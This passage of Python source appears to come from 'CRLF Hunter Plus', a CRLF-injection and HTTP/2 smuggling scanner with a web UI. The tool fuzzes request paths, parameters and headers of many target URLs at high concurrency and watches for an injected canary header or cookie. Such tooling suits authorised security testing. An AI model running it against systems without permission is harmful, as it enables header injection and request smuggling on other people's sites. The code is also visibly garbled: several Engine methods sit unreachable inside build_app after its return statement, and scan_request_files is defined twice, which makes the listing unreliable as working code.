            return self._record_finding(url, method, location, param, payload, status, redirected, ev, hdr_sample)
        return None

    def scan_request_files(self, files: List[str], default_scheme: str):
        """
        Parse each raw HTTP request file and perform CRLF injection scanning.
        Files should be Burp/ZAP export style with request line, headers, and
        optional body. default_scheme is used when the request line is a
        relative path with a Host header. Results are stored in self.findings.
        """
        for fp in files:
            try:
                mth, url, hdrs, body = load_request_file(fp, default_scheme)
                if self.args.verbose:
                    print(f"[REQFILE] {fp} => {mth} {url}")
                # Merge base headers for this run but do not override existing headers
                merged_headers: Dict[str, str] = dict(hdrs)
                for hk, hv in self.base_headers.items():
                    if not any(hk.lower() == ek.lower() for ek in merged_headers.keys()):
                        merged_headers[hk] = hv
                self._scan_request_template(mth, url, merged_headers, body)
            except Exception as e:
                print(f"[!] Could not parse {fp}: {e}", file=sys.stderr)

        # Wait for all queued fuzzing tasks to complete
        self.thread_pool.shutdown(wait=True)

# -----------------------------------------------------------------------------
# Additional helper functions for raw request parsing and custom fuzzing
# -----------------------------------------------------------------------------
# Hop-by-hop headers which should be stripped when replaying raw requests
HOP_BY_HOP = {
    "connection",
    "keep-alive",
    "proxy-authenticate",
    "proxy-authorization",
    "te",
    "trailers",
    "transfer-encoding",
    "upgrade",
}

def _strip_hop_by_hop(hdrs: Dict[str, str]) -> Dict[str, str]:
    """
    Remove hop-by-hop headers and Content-Length from a raw header dict. These
    headers are managed by the underlying HTTP client (requests/httpx) and
    should not be forwarded manually. Returns a new dict.
    """
    cleaned: Dict[str, str] = {}
    for k, v in hdrs.items():
        lk = k.lower()
        if lk in HOP_BY_HOP or lk == "content-length":
            continue
        cleaned[k] = v
    return cleaned

def parse_raw_http_request(text: str, default_scheme: str) -> Tuple[str, str, Dict[str, str], str]:
    """
    Parse a Burp/ZAP-style raw HTTP request into (method, url, headers, body).
    Supports absolute-form requests like 'POST https://example.com/path HTTP/1.1'
    or origin-form requests like 'POST /path HTTP/1.1' with a Host header. If
    only a relative path is provided, uses default_scheme and Host to build
    the full URL. Hop-by-hop and Content-Length headers are stripped.
    """
    # Normalise newlines to LF
    text = text.replace("\r\n", "\n")
    head, _, body = text.partition("\n\n")
    # Filter out any empty lines in header section
    head_lines: List[str] = [ln for ln in head.split("\n") if ln.strip()]
    if not head_lines:
        raise ValueError("Empty request file")
    # Parse request line
    req_line = head_lines[0].strip()
    m = re.match(r"^(\S+)\s+(\S+)\s+HTTP/\d\.\d$", req_line, flags=re.I)
    if not m:
        raise ValueError(f"Malformed request line: {req_line}")
    method = m.group(1).upper()
    target = m.group(2)
    # Parse headers
    hdrs: Dict[str, str] = {}
    for ln in head_lines[1:]:
        if ":" not in ln:
            continue
        k, v = ln.split(":", 1)
        hdrs[k.strip()] = v.strip()
    # Build full URL
    if target.lower().startswith("http://") or target.lower().startswith("https://"):
        url = target
    else:
        host = hdrs.get("Host") or hdrs.get("host")
        if not host:
            raise ValueError("Relative path used but no Host header found")
        if not target.startswith("/"):
            target = "/" + target
        url = f"{default_scheme}://{host}{target}"
    # Strip hop-by-hop headers and Content-Length
    hdrs = _strip_hop_by_hop(hdrs)
    return method, url, hdrs, body

def load_request_file(path: str, default_scheme: str) -> Tuple[str, str, Dict[str, str], str]:
    """
    Load and parse a raw HTTP request from a file on disk. Returns
    (method, url, headers, body).
    """
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return parse_raw_http_request(f.read(), default_scheme)

# -----------------------------------------------------------------------------
# Utilities for loading URL lists and writing outputs
# -----------------------------------------------------------------------------
def _iter_urls_from_file(path: str, assume_scheme: str) -> Iterable[str]:
    """
    Yield normalized URLs from a text file.

    - Skips empty lines and comments (# ...)
    - Trims whitespace
    - Prepends scheme if missing
    - Supports .gz files transparently
    """
    opener = gzip.open if path.endswith(".gz") else open
    mode = "rt"
    with opener(path, mode, encoding="utf-8", errors="ignore") as f:
        for ln in f:
            u = ln.strip()
            if not u or u.startswith("#"):
                continue
            # allow whitespace-separated lists (rare), take first token
            u = u.split()[0]
            if not (u.lower().startswith("http://") or u.lower().startswith("https://")):
                u = f"{assume_scheme}://{u.lstrip('/')}"
            yield u


def load_urls_from_files(paths: List[str], assume_scheme: str) -> List[str]:
    """
    Load many URLs with basic deduplication while preserving insertion order.
    """
    seen = set()
    out: List[str] = []
    for p in paths:
        for u in _iter_urls_from_file(p, assume_scheme):
            if u not in seen:
                seen.add(u)
                out.append(u)
    return out


def write_findings_json(path: str, findings: List[Finding]) -> None:
    """
    Write findings to a JSON file. Each finding is converted to a dict and written
    out as a pretty-printed JSON array.
    """
    payload = [asdict(f) for f in findings]
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(payload, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[!] Could not write JSON output: {e}", file=sys.stderr)


def write_findings_csv(path: str, findings: List[Finding]) -> None:
    """
    Write findings to a CSV file. Field names correspond to the Finding dataclass
    attributes; the raw_header_sample is serialised via JSON so the CSV format
    remains one line per finding.
    """
    cols = [
        "url", "method", "location", "parameter", "payload",
        "status", "redirected", "evidence",
        "injected_header_seen", "set_cookie_injected", "raw_header_sample"
    ]
    try:
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=cols)
            w.writeheader()
            for fin in findings:
                row = asdict(fin)
                # serialise header sample to JSON string to avoid column splitting
                row["raw_header_sample"] = json.dumps(row.get("raw_header_sample", {}), ensure_ascii=False)
                w.writerow({k: row.get(k, "") for k in cols})
    except Exception as e:
        print(f"[!] Could not write CSV output: {e}", file=sys.stderr)


def estimate_total_tasks(urls: List[str], payloads: List[str], body_params: Optional[str]) -> int:
    """
    Estimate the total number of payload injection attempts that will be performed during
    a scan. This corresponds to the number of futures submitted in Engine.scan(), and
    allows the progress bar to compute a percentage. The count considers query
    parameters, optional body parameters, and the path for each URL, multiplied by
    the number of payloads.

    :param urls: List of target URLs
    :param payloads: Payload list used for fuzzing
    :param body_params: Comma-separated body parameters (may be None)
    :return: Integer number of tasks
    """
    total = 0
    for target in urls:
        parsed = urlparse(target)
        # Count query parameters
        q_params = [k for (k, _) in parse_qsl(parsed.query, keep_blank_values=True)]
        # Count body parameters if provided
        b_params = [p.strip() for p in (body_params or "").split(",") if p.strip()]
        # We always test the path itself (represented as '-')
        num_locations = len(q_params) + len(b_params) + 1
        total += num_locations * len(payloads)
    return total


def progress_update(job_id: Optional[str], delta: int = 1) -> None:
    """
    Increment the completed task count for a given job. If job_id is None or the
    job is not registered, this function has no effect. The delta parameter allows
    multiple completions to be recorded at once.

    :param job_id: The identifier of the job to update
    :param delta: Number of tasks to add to the completed count
    """
    if not job_id:
        return
    with JOBS_LOCK:
        job = JOBS.get(job_id)
        if job and isinstance(job.get("done"), int):
            new_done = int(job["done"]) + max(0, delta)
            # ensure we don't exceed total
            if isinstance(job.get("total"), int):
                new_done = min(int(job["total"]), new_done)
            job["done"] = new_done


def progress_set_total(job_id: Optional[str], total: int) -> None:
    """
    Set the expected total number of tasks for a job. If job_id is None, this
    function does nothing. If the job does not exist in the registry, it is
    created.

    :param job_id: The identifier of the job
    :param total: Total number of tasks to perform
    """
    if not job_id:
        return
    with JOBS_LOCK:
        job = JOBS.setdefault(job_id, {"status": "running", "total": 0, "done": 0, "json": None, "csv": None})
        job["total"] = max(0, total)
        # adjust done to be within new total if necessary
        if isinstance(job.get("done"), int) and job["done"] > total:
            job["done"] = total


def _render_html(title: str, body: str) -> HTMLResponse:
    """
    Helper to wrap provided body HTML in a consistent layout with dark theme styles.
    Uses a balanced grid system so form elements align neatly in two columns on wide
    screens and stack on smaller displays. Returns an HTMLResponse for FastAPI.
    """
    base_css = """
    <style>
      :root { color-scheme: light dark; }
      * { box-sizing: border-box; }
      body {
        font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
        margin: 0;
        background: #0b0d10;
        color: #e8eaed;
      }
      header {
        padding: 24px;
        background: linear-gradient(135deg,#1c1f24 0%,#121418 100%);
        border-bottom: 1px solid #2a2f36;
      }
      h1 {
        margin: 0;
        font-size: 22px;
        letter-spacing: .3px;
      }
      main {
        max-width: 1060px;
        margin: 0 auto;
        padding: 28px 16px 64px;
      }
      .card {
        background: #151922;
        border: 1px solid #2a2f36;
        border-radius: 16px;
        padding: 24px;
        box-shadow: 0 10px 30px rgba(0,0,0,.35);
      }
      /* Layout */
      .grid { display: grid; gap: 16px; }
      .grid-2 { grid-template-columns: 1fr; }
      @media (min-width: 1024px) { .grid-2 { grid-template-columns: 1fr 1fr; } }
      /* Blocks hold rows so left and right columns align */
      .block { display: grid; gap: 10px; }
      .row {
        display: grid;
        grid-template-columns: 140px 1fr;
        gap: 12px;
        align-items: center;
      }
      /* Controls */
      label {
        font-weight: 600;
        font-size: 13px;
        color: #aab2c0;
      }
      input[type=text], input[type=number], input[type=file], textarea, select {
        width: 100%;
        padding: 10px 12px;
        border-radius: 10px;
        border: 1px solid #2a2f36;
        background: #0f131a;
        color: #e8eaed;
        outline: none;
      }
      textarea {
        min-height: 140px;
        font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      }
      input[type=file] { padding: 8px; }
      .muted {
        color: #91a0b6;
        font-size: 12px;
      }
      /* Buttons */
      .btn {
        background: linear-gradient(135deg,#4a66ff 0%, #00ccff 100%);
        border: none;
        color: white;
        padding: 10px 16px;
        border-radius: 10px;
        cursor: pointer;
        font-weight: 700;
        letter-spacing: .2px;
        box-shadow: 0 8px 20px rgba(0, 179, 255, .25);
      }
      .btn:disabled { filter: grayscale(.4); opacity:.7; cursor:not-allowed; }
      /* Table */
      table { width:100%; border-collapse: collapse; }
      th, td {
        padding: 8px 10px;
        font-size: 13px;
        border-bottom: 1px solid #2a2f36;
      }
      th {
        text-align: left;
        color:#aab2c0;
        font-weight: 600;
      }
      .pill {
        display:inline-block;
        padding:2px 8px;
        border-radius:9999px;
        font-size:12px;
        background:#0f131a;
        border:1px solid #2a2f36;
        color:#c9d4e3;
      }

      /* Progress bar styles used on the running page */
      .progress-wrap {
        margin-top: 12px;
        background:#0f131a;
        border:1px solid #2a2f36;
        border-radius:12px;
        overflow:hidden;
        height:14px;
      }
      .progress-bar {
        height:100%;
        width:0%;
        background:linear-gradient(90deg,#00ccff,#4a66ff);
        transition:width .25s ease;
      }
      .progress-text {
        margin-top:6px;
        font-size:12px;
        color:#aab2c0;
      }
      .actions {
        display:flex;
        gap:10px;
        margin-top:16px;
      }
    </style>
    """
    html = f"""<!doctype html>
    <html><head><meta charset="utf-8"><title>{title}</title>{base_css}</head>
    <body>
      <header><h1>CRLF Hunter – Web UI</h1></header>
      <main>{body}</main>
    </body></html>"""
    return HTMLResponse(html)


def build_app():
    """
    Construct and return a FastAPI application implementing the web UI for CRLF Hunter.
    The UI allows users to supply target URLs, upload request or URL list files, and configure
    scanning options. Results are displayed in a table and optional JSON/CSV files can be
    generated. If FastAPI is not installed, this function will raise an ImportError.
    """
    if FastAPI is None:
        raise RuntimeError("FastAPI not installed. Please install fastapi and uvicorn to use the web UI.")

    app = FastAPI()

    # Expose job progress and file download endpoints via HTTP. These are called
    # from the front-end to update the progress bar and to retrieve results.
    @app.get("/progress/{job_id}")
    async def ui_progress(job_id: str):
        """Return the current status and progress metrics for a given job."""
        with JOBS_LOCK:
            job = JOBS.get(job_id)
            if not job:
                raise HTTPException(status_code=404, detail="Job not found")
            return {"status": job.get("status"), "done": job.get("done"), "total": job.get("total")}

    @app.get("/download/{job_id}/{fmt}")
    async def ui_download(job_id: str, fmt: str):
        """Serve the generated JSON or CSV file for a completed job."""
        with JOBS_LOCK:
            job = JOBS.get(job_id)
            if not job or job.get("status") != "done":
                raise HTTPException(status_code=404, detail="Not ready")
            if fmt == "json" and job.get("json"):
                return FileResponse(job["json"], filename=os.path.basename(job["json"]))
            if fmt == "csv" and job.get("csv"):
                return FileResponse(job["csv"], filename=os.path.basename(job["csv"]))
        raise HTTPException(status_code=404, detail="File not available")

    def _run_job(job_id: str, args) -> None:
        """
        Background worker for web UI scans. Executes the scan using the Engine,
        writes outputs to files (creating temp files if none provided) and updates
        the JOBS registry upon completion. Any unhandled exception will mark the
        job as 'done' but may not provide output files.
        """
        try:
            # Ensure output file paths exist; if UI user left them blank, generate
            # temporary files in the system temp directory.
            if not getattr(args, "out_json", None):
                args.out_json = os.path.join(tempfile.gettempdir(), f"crlfhunter_{job_id}.json")
            if not getattr(args, "out_csv", None):
                args.out_csv = os.path.join(tempfile.gettempdir(), f"crlfhunter_{job_id}.csv")
            # Bind job ID into args so Engine can update progress
            args.job_id = job_id
            engine = Engine(args)
            # Dispatch appropriate scan
            if args.request_file:
                engine.scan_request_files(args.request_file, args.req_scheme)
            elif args.smuggle_h2:
                engine.smuggle_h2_scan(args.url)
            else:
                engine.scan(args.url)
            # Persist outputs
            if args.out_json:
                try:
                    write_findings_json(args.out_json, engine.findings)
                except Exception:
                    pass
            if args.out_csv:
                try:
                    write_findings_csv(args.out_csv, engine.findings)
                except Exception:
                    pass
            # Update job registry
            with JOBS_LOCK:
                job = JOBS.get(job_id)
                if job:
                    job["status"] = "done"
                    job["json"] = args.out_json
                    job["csv"] = args.out_csv
                    # Ensure progress is complete
                    if isinstance(job.get("total"), int):
                        job["done"] = job.get("total")
        except Exception:
            # On failure, still mark job as done to stop spinner; files may be missing
            with JOBS_LOCK:
                job = JOBS.get(job_id)
                if job:
                    job["status"] = "done"


    @app.get("/", response_class=HTMLResponse)
    async def index():
        # Balanced two‑column form. The .grid-2 class adapts to one column on small screens.
        body = """
<div class="card">
  <form method="post" action="/run" enctype="multipart/form-data" class="grid grid-2">
    <!-- Left column -->
    <div class="block">
      <div class="row">
        <label>Target URLs</label>
        <textarea name="urls" placeholder="https://example.com/?q=x"></textarea>
      </div>
      <div class="row">
        <label>Body params to fuzz</label>
        <input type="text" name="body_params" placeholder="search,comment" />
      </div>
      <div class="row">
        <label>Headers (-H)</label>
        <textarea name="headers" placeholder="X-Api-Key: ABC123"></textarea>
      </div>
      <div class="row">
        <label>Cookies (-C)</label>
        <textarea name="cookies" placeholder="SESSION=abcd1234"></textarea>
      </div>
      <div class="row">
        <label>Auth helper</label>
        <input type="text" name="auth" placeholder="basic:user:pass | bearer:TOKEN | raw:Name: Value" />
      </div>
      <div class="row">
        <label>Proxy</label>
        <input type="text" name="proxy" placeholder="http://127.0.0.1:8080" />
      </div>
    </div>

    <!-- Right column -->
    <div class="block">
      <div class="row">
        <label>URL List (.txt or .gz)</label>
        <input type="file" name="url_file" />
      </div>
      <div class="row">
        <label>Assume scheme</label>
        <select name="assume_scheme">
          <option value="https" selected>https</option>
          <option value="http">http</option>
        </select>
      </div>
      <div class="row">
        <label>Request files (Burp/ZAP raw)</label>
        <input type="file" name="req_files" multiple />
      </div>
      <div class="row">
        <label>Request placeholder</label>
        <input type="text" name="req_placeholder" value="{{CRLF}}" />
      </div>
      <div class="row">
        <label>Default req scheme</label>
        <select name="req_scheme">
          <option value="https" selected>https</option>
          <option value="http">http</option>
        </select>
      </div>
      <div class="row">
        <label>Threads</label>
        <input type="number" name="threads" value="40" />
      </div>
      <div class="row">
        <label>Timeout (s)</label>
        <input type="number" name="timeout" value="12" />
      </div>
      <div class="row">
        <label>Retries</label>
        <input type="number" name="retries" value="2" />
      </div>
      <div class="row">
        <label>Backoff (s)</label>
        <input type="number" name="backoff" step="0.05" value="0.25" />
      </div>
      <div class="row">
        <label>Rate (s/req)</label>
        <input type="number" name="rate" step="0.01" value="0.00" />
      </div>
      <div class="row">
        <label>Max in-flight</label>
        <input type="number" name="max_inflight" placeholder="auto" />
      </div>
      <div class="row">
        <label>Follow redirects</label>
        <select name="follow_redirects">
          <option value=""></option>
          <option value="1">Yes</option>
        </select>
      </div>
      <div class="row">
        <label>HTTP/2</label>
        <select name="http2">
          <option value=""></option>
          <option value="1">Yes</option>
        </select>
      </div>
      <div class="row">
        <label>Fuzz headers</label>
        <select name="fuzz_headers">
          <option value=""></option>
          <option value="1">Yes</option>
        </select>
      </div>
      <div class="row">
        <label>Smuggle h2</label>
        <select name="smuggle_h2">
          <option value=""></option>
          <option value="1">Yes</option>
        </select>
      </div>
      <div class="row">
        <label>Login URL</label>
        <input type="text" name="login_url" />
      </div>
      <div class="row">
        <label>Login data</label>
        <input type="text" name="login_data" placeholder="username=admin&password=pass" />
      </div>
      <div class="row">
        <label>Out JSON</label>
        <input type="text" name="out_json" placeholder="findings.json" />
      </div>
      <div class="row">
        <label>Out CSV</label>
        <input type="text" name="out_csv" placeholder="findings.csv" />
      </div>
    </div>

    <!-- Submit row -->
    <div style="grid-column: 1 / -1; margin-top: 8px; display:flex; gap:12px; align-items:center;">
      <button class="btn" type="submit">Run scan</button>
      <span class="muted">You'll get a results table (and files if you set outputs)</span>
    </div>
  </form>
</div>
"""
        return _render_html("CRLF Hunter UI", body)

    @app.post("/run", response_class=HTMLResponse)
    async def run(
        request: Request,
        urls: str = Form(default=""),
        url_file: UploadFile | None = None,
        assume_scheme: str = Form(default="https"),
        body_params: str = Form(default=""),
        headers: str = Form(default=""),
        cookies: str = Form(default=""),
        auth: str = Form(default=""),
        req_files: list[UploadFile] | None = None,
        req_placeholder: str = Form(default="{{CRLF}}"),
        req_scheme: str = Form(default="https"),
        threads: int = Form(default=40),
        timeout: int = Form(default=12),
        retries: int = Form(default=2),
        backoff: float = Form(default=0.25),
        rate: float = Form(default=0.0),
        max_inflight: str = Form(default=""),
        follow_redirects: str = Form(default=""),
        http2: str = Form(default=""),
        fuzz_headers: str = Form(default=""),
        smuggle_h2: str = Form(default=""),
        proxy: str = Form(default=""),
        login_url: str = Form(default=""),
        login_data: str = Form(default=""),
        out_json: str = Form(default=""),
        out_csv: str = Form(default="")
    ):
        """
        Handle form submission. Construct an Engine with options specified in the form,
        run the scan accordingly, and render results in HTML. Also optionally write
        JSON/CSV outputs if requested. Uploaded files are saved to temporary files.
        """
        # Build a dummy args object with just the fields required by Engine and CLI
        class Dummy:
            pass
        args = Dummy()
        # copy defaults
        args.threads = int(threads)
        args.timeout = int(timeout)
        args.retries = int(retries)
        args.backoff = float(backoff)
        args.rate = float(rate)
        args.follow_redirects = bool(follow_redirects)
        args.http2 = bool(http2)
        args.fuzz_headers = bool(fuzz_headers)
        args.smuggle_h2 = bool(smuggle_h2)
        args.proxy = proxy or None
        args.auth = auth or None
        args.body_params = body_params or None
        args.login_url = login_url or None
        args.login_data = login_data or None
        args.payloads = None
        args.header = []
        args.cookie = []
        args.verbose = False
        args.canary_path = None
        args.request_file = None
        args.req_scheme = req_scheme
        args.req_placeholder = req_placeholder
        args.out_json = out_json or None
        args.out_csv = out_csv or None
        # parse max_inflight numeric
        args.max_inflight = int(max_inflight) if (max_inflight and max_inflight.isdigit()) else 0

        # parse headers and cookies textareas
        for ln in (headers or "").splitlines():
            ln = ln.strip()
            if ln:
                args.header.append(ln)
        for ln in (cookies or "").splitlines():
            ln = ln.strip()
            if ln:
                args.cookie.append(ln)

        # Parse URLs from textarea
        url_list: List[str] = []
        if urls.strip():
            for ln in urls.splitlines():
                s = ln.strip()
                if not s or s.startswith("#"):
                    continue
                if not (s.lower().startswith("http://") or s.lower().startswith("https://")):
                    s = f"{assume_scheme}://{s.lstrip('/')}"
                url_list.append(s)

        # handle uploaded URL file (.txt or .gz)
        if url_file and url_file.filename:
            import tempfile
            suffix = ".gz" if url_file.filename.lower().endswith(".gz") else ".txt"
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tf:
                raw = await url_file.read()
                tf.write(raw)
                temp_path = tf.name
            try:
                more = load_urls_from_files([temp_path], assume_scheme)
                url_list.extend(more)
            except Exception:
                pass

        # handle uploaded raw request files
        if req_files:
            import tempfile
            rf_paths: List[str] = []
            for f in req_files:
                if not f.filename:
                    continue
                with tempfile.NamedTemporaryFile(delete=False, suffix=".req") as tf:
                    tf.write(await f.read())
                    rf_paths.append(tf.name)
            args.request_file = rf_paths if rf_paths else None

        # finalise URL list
        args.url = url_list

        # Launch a background job for the scan and return a progress page immediately.
        # Create a unique job identifier and register it in the job registry.
        job_id = uuid.uuid4().hex
        with JOBS_LOCK:
            JOBS[job_id] = {"status": "running", "total": 0, "done": 0, "json": None, "csv": None}
        # Spawn worker thread to perform the scan without blocking the UI.
        t = threading.Thread(target=_run_job, args=(job_id, args), daemon=True)
        t.start()
        # Build HTML with progress bar and hidden download buttons. The client-side
        # script will poll the /progress endpoint and update the bar and message.
        # Build the progress page. Use .format rather than f-string to avoid
        # accidental interpolation of curly braces in JavaScript. The {job_id}
        # placeholder is filled after the string literal is defined.
        progress_html = """
<div class="card">
  <p class="muted">Your scan is running...</p>
  <div class="progress-wrap"><div id="bar" class="progress-bar" style="width:0%"></div></div>
  <div id="pct" class="progress-text">0% complete</div>
  <div id="done" style="display:none; margin-top:12px;">
    <div class="actions">
      <a class="btn" href="/download/{job_id}/json">Download JSON</a>
      <a class="btn" href="/download/{job_id}/csv">Download CSV</a>
      <a class="btn" href="/">Run another scan</a>
    </div>
  </div>
</div>
<script>
  const bar = document.getElementById('bar');
  const pct = document.getElementById('pct');
  const doneBox = document.getElementById('done');

  async function poll() {{
    try {{
      const resp = await fetch('/progress/{job_id}');
      if (resp.ok) {{
        const j = await resp.json();
        const total = Math.max(1, j.total || 1);
        const done = Math.min(total, j.done || 0);
        const percent = Math.round(done * 100 / total);
        bar.style.width = percent + '%';
        pct.textContent = percent + '% complete';
        if (j.status === 'done') {{
          bar.style.width = '100%';
          pct.textContent = '100% complete';
          doneBox.style.display = 'block';
          return;
        }}
      }}
    }} catch (e) {{
      // ignore errors; will retry
    }}
    setTimeout(poll, 500);
  }}
  poll();
</script>
""".format(job_id=job_id)
        return _render_html("CRLF Hunter – Running", progress_html)

    # End of /run handler. After defining the handler, return the FastAPI app.
    return app

    # -------------------------------------------------------------------------
    # Raw request and template-based injection scanning
    # -------------------------------------------------------------------------
    def _send_raw(self, method: str, url: str, headers: Dict[str, str], body: Optional[str]):
        """
        Send a raw HTTP request using either requests or httpx depending on
        HTTP/2 settings. Returns the response object. Cookies and redirect
        behaviour honour the Engine's configuration.
        """
        # Use httpx for HTTP/2 if enabled and target is HTTPS
        if self.httpx_client and self.args.http2 and url.lower().startswith("https"):
            return self.httpx_client.request(method, url, headers=headers, content=body, cookies=self.cookies)
        # Fallback to requests
        return self.req_session.request(method, url, headers=headers, data=body,
                                        cookies=self.cookies,
                                        allow_redirects=self.args.follow_redirects,
                                        timeout=self.args.timeout)

    def _evaluate_evidence(self, resp) -> Tuple[bool, bool, List[str], Dict[str, str], int, bool]:
        """
        Examine an HTTP response for evidence of CRLF injection. Returns a tuple
        (injected_header, set_cookie, evidence_list, header_sample, status_code, redirected).
        """
        status = resp.status_code
        headers = {k: v for k, v in resp.headers.items()}
        injected = any(hdr.lower() == "x-injected-canary" for hdr in headers)
        evidence: List[str] = []
        if injected:
            evidence.append("Saw X-Injected-Canary header")
        # Check marker presence in header values
        for hdr_name, hdr_val in headers.items():
            if "X-Injected-Canary" in hdr_val:
                injected = True
                evidence.append(f"Marker in {hdr_name} header value")
                break
        set_cookie = False
        # Check Set-Cookie header or cookie jar for injected cookie
        sc = headers.get("Set-Cookie", "")
        if "crlf=1" in sc or any("crlf=1" in c for c in getattr(resp, "cookies", [])):
            set_cookie = True
            evidence.append("Injected Set-Cookie observed")
        hdr_sample = short_hdrs(headers)
        redirected = (300 <= status < 400)
        return injected, set_cookie, evidence, hdr_sample, status, redirected

    def _record_finding(self, url: str, method: str, location: str, param: str, payload: str,
                        status: int, redirected: bool, ev_list: List[str], hdr_sample: Dict[str, str]) -> Finding:
        """
        Build a Finding dataclass instance from the given parameters and evidence list.
        """
        evidence_str = "; ".join(ev_list) if ev_list else "(see response)"
        return Finding(url=url, method=method, location=location, parameter=param, payload=payload,
                       status=status, redirected=redirected, evidence=evidence_str,
                       injected_header_seen=("Saw X-Injected-Canary header" in ev_list),
                       set_cookie_injected=("Injected Set-Cookie observed" in ev_list),
                       raw_header_sample=hdr_sample)

    def _scan_request_template(self, method: str, url: str, headers: Dict[str, str], body: str):
        """
        Given a parsed raw request (method, url, headers, body), fuzz CRLF injection
        points. If the placeholder specified by args.req_placeholder is present in
        any part of the request (URL, header values, or body), replace it with
        each payload. Otherwise, perform automatic fuzzing by appending each
        payload to the path, each query parameter, and (if form-encoded) each
        body parameter. Optionally fuzz header values if --fuzz-headers is set.
        All generated requests are dispatched concurrently via the thread pool.
        """
        placeholder = self.args.req_placeholder
        # Determine if a placeholder exists anywhere
        template_present = False
        if placeholder in url:
            template_present = True
        else:
            for v in headers.values():
                if placeholder in v:
                    template_present = True
                    break
            if not template_present and body:
                template_present = placeholder in body
        tasks: List[Tuple[str, str, Dict[str, str], Optional[str], str, str, str]] = []
        # Template-based fuzzing: simple replacement of placeholder
        if template_present:
            for payload in self.payloads:
                u = url.replace(placeholder, payload)
                hdrs = {k: v.replace(placeholder, payload) for k, v in headers.items()}
                b: Optional[str] = body
                if b is not None:
                    b = b.replace(placeholder, payload)
                tasks.append((method, u, hdrs, b, "template", "-", payload))
        else:
            # Automatic fuzzing: path injection
            parsed = urlparse(url)
            base_path = parsed.path if parsed.path else "/"
            for payload in self.payloads:
                new_path = base_path + ("" if base_path.endswith("/") else "/") + payload
                new_url = urlunparse(parsed._replace(path=new_path))
                tasks.append((method, new_url, dict(headers), body, "path", "-", payload))
            # Query param injection
            qs = parse_qsl(parsed.query, keep_blank_values=True)
            if qs:
                param_names = list({k for k, _ in qs})
                for payload in self.payloads:
                    new_q = []
                    for (k, v) in qs:
                        new_q.append((k, v + payload))
                    new_url = urlunparse(parsed._replace(query=urlencode(new_q, doseq=True)))
                    for nm in param_names:
                        tasks.append((method, new_url, dict(headers), body, "query", nm, payload))
            # Body injection (for x-www-form-urlencoded content)
            ctype = ""
            for k, v in headers.items():
                if k.lower() == "content-type":
                    ctype = v.lower()
                    break
            if body and "application/x-www-form-urlencoded" in ctype:
                body_pairs = parse_qsl(body, keep_blank_values=True)
                param_names = list({k for k, _ in body_pairs})
                for payload in self.payloads:
                    new_body_pairs = []
                    for (k, v) in body_pairs:
                        new_body_pairs.append((k, v + payload))
                    encoded_body = urlencode(new_body_pairs)
                    tasks.append((method, url, dict(headers), encoded_body, "body", ",".join(param_names), payload))
            # Header value fuzzing (suffix) if enabled
            if getattr(self.args, "fuzz_headers", False):
                for payload in self.payloads:
                    for hk, hv in headers.items():
                        if hk.lower() == "host":
                            continue  # avoid altering Host
                        mutated = dict(headers)
                        mutated[hk] = hv + payload
                        tasks.append((method, url, mutated, body, "headers", hk, payload))
        # Dispatch tasks concurrently
        futs = []
        for (m, u, h, b, loc, param, payload) in tasks:
            futs.append(self.thread_pool.submit(self._one_request_try, m, u, h, b, loc, param, payload))
        for fut in futures.as_completed(futs):
            fnd = fut.result()
            if fnd:
                with lock:
                    self.findings.append(fnd)

    def _one_request_try(self, method: str, url: str, headers: Dict[str, str], body: Optional[str],
                         location: str, param: str, payload: str) -> Optional[Finding]:
        """
        Helper to send a single fuzzed request and evaluate evidence. Returns a
        Finding on success or None.
        """
        try:
            resp = self._send_raw(method, url, headers, body)
        except Exception:
            return None
        injected, set_cookie, ev, hdr_sample, status, redirected = self._evaluate_evidence(resp)
        if injected or set_cookie:
            return self._record_finding(url, method, location, param, payload, status, redirected, ev, hdr_sample)
        return None

    def scan_request_files(self, files: List[str], default_scheme: str):
        """
        Parse each raw HTTP request file and perform CRLF injection scanning.
        Files should be Burp/ZAP export style with request line, headers, and
        optional body. default_scheme is used when the request line is a
        relative path with a Host header. Results are stored in self.findings.
        """
        for fp in files:
            try:
                mth, url, hdrs, body = load_request_file(fp, default_scheme)
                if self.args.verbose:
                    print(f"[REQFILE] {fp} => {mth} {url}")
                self._scan_request_template(mth, url, hdrs, body)
            except Exception as e:
                print(f"[!] Could not parse {fp}: {e}", file=sys.stderr)

# -----------------------------------------------------------------------------
# Command-line interface
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        description=(
            "CRLF Hunter Plus – high‑coverage CRLF injection scanner and smuggling tester, "
            "with optional interactive web UI. Supports scanning single URLs or thousands "
            "from text files, fuzzing query/body parameters or headers, and exporting "
            "findings to JSON or CSV."
        ),
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog=(
            "Examples:\n"
            "  # Scan a big list of endpoints and save results\n"
            "  crlfhunter.py --url-file scope.txt --out-json findings.json --out-csv findings.csv -t 100\n\n"
            "  # Launch the built‑in FastAPI UI on the default port 8965\n"
            "  crlfhunter.py --ui\n\n"
            "  # Ask to start the UI when no targets are provided\n"
            "  crlfhunter.py --ask-ui\n\n"
            "  # Perform an HTTP/2 smuggling probe and output JSON\n"
            "  crlfhunter.py --smuggle-h2 https://example.com --out-json smuggle.json\n"
        ),
    )
    ap.add_argument("url", nargs="*", help="Target URL(s) to scan (include scheme)")
    # URL list and concurrency controls
    ap.add_argument(
        "--url-file",
        action="append",
        help=(
            "Path to a text file containing target URLs (one per line). Supports plain text "
            "or gzip compressed (.gz) files. Use multiple times to scan multiple lists."
        ),
    )
    ap.add_argument("--assume-scheme", choices=["http", "https"], default="https",
                    help="If a URL from --url-file lacks a scheme, prepend this (default: https).")
    ap.add_argument(
        "--max-inflight",
        type=int,
        default=0,
        help=(
            "Cap the number of queued HTTP tasks in memory. Useful when scanning "
            "tens of thousands of targets to prevent RAM exhaustion. A value of 0 "
            "auto‑scales to threads*50."
        ),
    )
    ap.add_argument("-p", "--payloads", help="Custom payloads file (one per line) to use instead of defaults")
    ap.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="Number of concurrent threads")
    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="HTTP timeout for requests (seconds)")
